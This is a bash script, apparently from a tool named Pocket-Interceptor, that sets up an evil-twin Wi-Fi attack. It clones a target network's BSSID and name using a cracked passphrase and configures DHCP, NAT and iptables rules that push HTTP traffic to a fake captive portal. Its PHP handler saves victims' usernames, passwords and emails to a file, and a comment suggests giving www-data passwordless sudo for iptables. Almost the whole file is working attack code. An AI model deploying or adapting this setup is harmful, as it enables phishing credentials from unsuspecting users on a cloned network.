#!/bin/bash
SELECTED_INTERFACE="wlan0"
MON_INTERFACE="wlan0mon"
INTERFACE_INTERNET_OUTPUT="eth0"

BSSID_VAR="D4:60:E3:C0:D8:36"
CHANNEL_VAR="11"
PRIVACY_VAR="WPA2 WPA"
CIPHER_VAR="CCMP TKIP"
AUTH_VAR="PSK"
BEACONS_VAR=""
ESSID_VAR="PI_WIFI_TEST"

PASSWORD_cracked="A123456789a!"

cd ./Pocket-Interceptor


FILE_isc="isc-dhcp-server"
DIRECTORY="./templates/"
FILE_dhcp="dhcpd.conf"

activate_dhcp(){

    
    FILE_isc="isc-dhcp-server"
    DIRECTORY="./templates/"
    FILE_dhcp="dhcpd.conf"
    sudo cp "${DIRECTORY}isc-dhcp-server_template" "${DIRECTORY}${FILE_isc}"

    echo "INTERFACESv4=\"${SELECTED_INTERFACE}\"" >> "${DIRECTORY}${FILE_isc}"
    echo 'INTERFACESv6=""' >> "${DIRECTORY}${FILE_isc}"

    sudo cp "${DIRECTORY}${FILE_isc}" /etc/default/
    

    cat <<EOF > "${DIRECTORY}${FILE_dhcp}"
subnet 192.168.1.0 netmask 255.255.255.0 {
    range 192.168.1.15 192.168.1.200;
    option routers 192.168.1.1;
    option domain-name-servers 8.8.8.8, 8.8.4.4;
    option broadcast-address 192.168.1.255;
    default-lease-time 600;
    max-lease-time 7200;
}
EOF

    sudo cp "${DIRECTORY}${FILE_dhcp}" /etc/dhcp/
    
    if sudo systemctl restart isc-dhcp-server ; then
        echo "Succesful DHCP Server"
        return 0
    else
        echo "Error on DHCP Server"
        return 1
    fi
    # sudo journalctl -fu isc-dhcp-server ( Ver en tiempo real el DHCP)
}

ask_interface_out(){
    INTERFACES=($(ip -o link show | awk -F': ' '{print $2}'))

    #Verifica si tiene interfaces activas
    if [ ${#INTERFACES[@]} -lt 1 ]; then
    echo "There's no active interfaces."
    exit 1
    fi

    # Mostrar las interfaces disponibles
    echo "Select a network interface to take the traffic outside:"
    for i in "${!INTERFACES[@]}"; do
        echo "$((i+1)). ${INTERFACES[i]}"
    done

    # Leer la selección del usuario
    read -p "Enter the interface wanted to take the traffic outside: " CHOICE

    # Validar la entrada
    if [[ ! "$CHOICE" =~ ^[0-9]+$ ]] || ((CHOICE < 1 || CHOICE > ${#INTERFACES[@]})); then
        echo "Selected interface not valid."
        exit 1
    fi

    # Obtener la interfaz seleccionada
    INTERFACE_OUTPUT="${INTERFACES[CHOICE-1]}"
    echo "INTERFACE output is : $INTERFACE_OUTPUT"
}

rules_iptables_ipforward(){

    sudo sysctl -w net.ipv4.ip_forward=1

    
    sudo iptables -t nat -A POSTROUTING -o $INTERFACE_OUTPUT -j MASQUERADE

    # Bloquear tráfico de los clientes excepto al portal cautivo (80, 443)
    sudo iptables -A FORWARD -i wlan0 -o eth0 -j REJECT
    sudo iptables -A FORWARD -i wlan0 -p tcp --dport 80 -d 192.168.1.1 -j ACCEPT
    sudo iptables -A FORWARD -i wlan0 -p tcp --dport 443 -d 192.168.1.1 -j ACCEPT

    # Redirigir todo el tráfico HTTP al portal cautivo
    sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1
    

}

cleanup() {
    echo "[+] Restaurando configuración de red..."


    # Eliminar la regla NAT de POSTROUTING
    sudo iptables -t nat -D POSTROUTING -o $INTERFACE_OUTPUT -j MASQUERADE

    # Eliminar la regla de REJECT para bloquear tráfico de clientes (excepto portal cautivo)
    sudo iptables -D FORWARD -i wlan0 -o eth0 -j REJECT

    # Eliminar las reglas para permitir tráfico HTTP y HTTPS solo al portal cautivo
    sudo iptables -D FORWARD -i wlan0 -p tcp --dport 80 -d 192.168.1.1 -j ACCEPT
    sudo iptables -D FORWARD -i wlan0 -p tcp --dport 443 -d 192.168.1.1 -j ACCEPT

    # Eliminar la regla de redirección del tráfico HTTP al portal cautivo
    sudo iptables -t nat -D PREROUTING -i wlan0 -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1

    sudo sysctl -w net.ipv4.ip_forward=0
    echo "[+] Reglas de iptables eliminadas. Saliendo..."

    sudo ip addr del 192.168.1.1/24 dev $SELECTED_INTERFACE

    sudo ip link set $SELECTED_INTERFACE down
    sudo iw dev $SELECTED_INTERFACE set type managed
    sudo ip link set $SELECTED_INTERFACE up

    sudo systemctl stop isc-dhcp-server
    sudo iptables -F FORWARD

    sudo rm "${DIRECTORY}${FILE_isc}"
    sudo rm "${DIRECTORY}${FILE_dhcp}"
}

false_ap(){

    

    #Deauther 15 &

    if echo "$PRIVACY_VAR" | grep -q "WPA2 WPA"; then 
        WPA=3
    elif echo "$PRIVACY_VAR" | grep -q "WPA2"; then
        WPA=2
    elif echo "$PRIVACY_VAR" | grep -q "WPA"; then
        WPA=1
    else
        WPA=0  # AP Abierto o WEP (no recomendado)
    fi

    if echo "$AUTH_VAR" | grep -q "PSK"; then
        WPA_KEY_MGMT="WPA-PSK"
    elif echo "$AUTH_VAR" | grep -q "EAP"; then
        WPA_KEY_MGMT="WPA-EAP"
    else
        WPA_KEY_MGMT=""  # Red abierta
    fi

    if echo "$CIPHER_VAR" | grep -q "CCMP" && echo "$CIPHER_VAR" | grep -q "TKIP"; then
        RSN_PAIRWISE="CCMP TKIP"
    elif echo "$CIPHER_VAR" | grep -q "CCMP"; then
        RSN_PAIRWISE="CCMP"
    elif echo "$CIPHER_VAR" | grep -q "TKIP"; then
        RSN_PAIRWISE="TKIP"
    else
        RSN_PAIRWISE=""  # Red abierta o WEP
    fi

    cat <<EOF > hostapd.conf
interface=$SELECTED_INTERFACE
driver=nl80211
ssid=$ESSID_VAR
bssid=$BSSID_VAR
hw_mode=g
channel=$CHANNEL_VAR
macaddr_acl=0
auth_algs=1
wpa=$WPA
wpa_passphrase=$PASSWORD_cracked
wpa_key_mgmt=$WPA_KEY_MGMT
rsn_pairwise=$RSN_PAIRWISE

EOF

    echo "Done hostapd.conf Correctly."
   

    sudo ip link set $SELECTED_INTERFACE down
    sudo iw dev $SELECTED_INTERFACE set type ap
    sudo ip link set $SELECTED_INTERFACE up
    #En caso que el usuario tenga ya una ip en la interfaz wifi
    sudo ip addr flush dev wlan0
    sudo ip addr add 192.168.1.1/24 dev $SELECTED_INTERFACE
    if ! activate_dhcp; then 
        echo "Error"
        exit 1
    fi
    ask_interface_out
    #cleanup
    rules_iptables_ipforward
    sudo hostapd hostapd.conf #-B for broadcast

}





create_fake_captive_portal(){

    cat <<EOF > "${DIRECTORY}index.php"
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Captive Portal $ESSID_VAR</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="portal">
        <h1>WiFi Login $ESSID_VAR</h1>
        <form action="register.php" method="POST">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <input type="email" name="email" placeholder="Email" required>
            <button type="submit">Register</button>
        </form>
    </div>
</body>
</html>
EOF

    cat <<EOF > "${DIRECTORY}style.css"
body {
    font-family: Arial, sans-serif;
    background: #f0f0f0;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
}

.portal {
    background: white;
    padding: 2rem;
    border-radius: 8px;
    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
    text-align: center;
    width: 300px;
}

input {
    width: 100%;
    padding: 10px;
    margin: 10px 0;
    border: 1px solid #ddd;
    border-radius: 4px;
}

button {
    background: #007bff;
    color: white;
    border: none;
    padding: 10px 15px;
    border-radius: 4px;
    cursor: pointer;
    width: 100%;
}

button:hover {
    background: #0056b3;
}
EOF

    cat <<EOF > "${DIRECTORY}login.php"
<?php
// File where credentials will be saved
$file = '/home/edusagnier/Desktop/creds.txt';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = htmlspecialchars($_POST['username']);
    $password = htmlspecialchars($_POST['password']);
    $email = htmlspecialchars($_POST['email']);

    // Format: "Username:Password:Email"
    $data = "$username:$password:$email\n";

    // Append to file (create if not exists)
    file_put_contents($file, $data, FILE_APPEND | LOCK_EX);

    // Redirect after saving
    header('Location: index.php?success=1');
    exit;
}
?>
EOF


#┌──(edusagnier㉿interceptor)-[/var/www/html]
#└─$ touch creds.txt
                                                                                                                                                                                                                                  
#┌──(edusagnier㉿interceptor)-[/var/www/html]
#└─$ sudo chmod 775 creds.txt     
                                                                                                                                                                                                                                  
#┌──(edusagnier㉿interceptor)-[/var/www/html]
#└─$ sudo chown www-data creds.txt    

}

false_ap
trap cleanup EXIT

#fake_captive_portal


# echo "www-data ALL=(ALL) NOPASSWD: /sbin/iptables" >> /etc/sudoers Para que se pueda ejecutar iptables el PHP